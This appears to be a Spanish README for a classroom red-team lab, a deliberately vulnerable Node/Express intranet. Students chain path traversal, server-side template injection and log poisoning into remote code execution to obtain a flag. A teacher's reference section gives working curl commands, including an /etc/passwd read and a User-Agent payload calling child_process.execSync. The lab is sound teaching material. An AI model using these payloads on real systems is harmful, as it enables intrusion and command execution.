# Lab Log Poisoning → RCE (Node / Express)

Laboratorio **educativo** de seguridad web para un curso de equipo rojo. El alumno explota
la cadena **lectura de archivos → Log Poisoning → ejecución de código (RCE)** en una
"intranet" deliberadamente vulnerable escrita en **Node/Express**, y obtiene una **flag
única por alumno**.

> **Marco ético.** Entorno autorizado y desechable del curso. La app es ficticia (ACME).
> No uses estas técnicas fuera de este laboratorio.

## La cadena del reto
1. **Lectura de archivos (LFI/path traversal):** el visor lee `?page=<archivo>` sin validarlo.
2. **Motor de plantillas inseguro (SSTI):** el visor **evalúa expresiones `${...}` como
   JavaScript** del lado del servidor.
3. **Log Poisoning:** la intranet registra cada visita con su `User-Agent` sin filtrar en
   `/var/log/lab/<sala>.log`. El alumno envía un `User-Agent` que es una expresión de plantilla
   (`${ require("child_process").execSync(cmd) }`).
4. **RCE:** al **renderizar el log** por el visor, esa expresión se ejecuta en el servidor;
   con `&cmd=` el alumno ejecuta comandos.
5. **Flag:** la flag solo la genera `/usr/local/bin/getflag <sala>`, un binario **ejecutable
   pero no legible** (0711 root; el proceso corre como `node`). No se puede leer ni predecir:
   **hay que lograr RCE**. El alumno lo ejecuta, copia el `FLAG{...}` y lo valida.

Una **guía interactiva de 6 etapas** (en JS) detecta el progreso real (polling a `/status`,
leyendo el log de la sala) y enciende cada paso a medida que el alumno lo logra.

## Multi-alumno por "salas"
Una sola instancia sirve a toda la clase. El alumno entra con su nombre (login en `/`), que lo
manda a su sala (`?room=<nombre>`). El log a envenenar y la flag son **por sala**: cada alumno
hace su propia explotación y obtiene una flag distinta e impredecible.

---

## Inicio rápido (Codespaces, sin AWS)
El paso a paso con Docker + túnel Cloudflare está en **[`docker cloud.md`](./docker%20cloud.md)**.
Resumen:
```bash
docker compose up -d --build                    # intranet en el puerto 80 (node en :3000 dentro)
cloudflared tunnel --url http://localhost:80    # URL pública temporal para la clase
```
Abre el puerto 80 (o la URL del túnel) → verás el **login** de la intranet.

> **GitHub Pages no sirve**: este lab necesita un servidor Node en ejecución, no estáticos.

## Rutas
| Ruta | Qué hace |
|------|----------|
| `GET /` | Login; con `?room=` entra a la intranet. |
| `GET /?room=NAME&page=FILE&cmd=CMD` | Visor que **lee y renderiza** `FILE` (LFI + SSTI). |
| `GET /status?room=NAME` | Progreso del reto en JSON (lo usa la guía). |
| `GET /check?room=NAME&flag=...` | Valida la flag de la sala. |

## Estructura
```
Dockerfile            Imagen node:20; compila getflag (0711); corre como 'node'
docker-compose.yml    Publica 80 -> 3000
getflag.c             Generador de la flag por sala (secreto no legible)
package.json          Dependencia: express
server.js             Login + intranet + visor vulnerable (LFI+SSTI) + log por sala
public/guide.js       Guía dinámica de 6 etapas (polling a /status)
public/style.css      Estilos
pages/                Plantillas benignas de la intranet (home, about)
.devcontainer/        Codespaces: Docker-in-Docker + cloudflared
```

## Prueba de la cadena (referencia del docente)
Con el lab en `http://localhost` (sala `demo`):
```bash
# 1) lectura de archivos
curl -s "http://localhost/?room=demo&page=/etc/passwd" | grep root:x:0:0
# 2) envenenar el log (User-Agent = expresion JS de plantilla)
curl -s -A '${require("child_process").execSync(cmd).toString()}' "http://localhost/?room=demo" >/dev/null
# 3) RCE renderizando el log
curl -s "http://localhost/?room=demo&page=/var/log/lab/demo.log&cmd=id" | grep -o 'uid=[0-9]*'
# 4) flag (solo via ejecucion del binario)
curl -s "http://localhost/?room=demo&page=/var/log/lab/demo.log&cmd=getflag%20demo" | grep -o 'FLAG{[^}]*}'
```
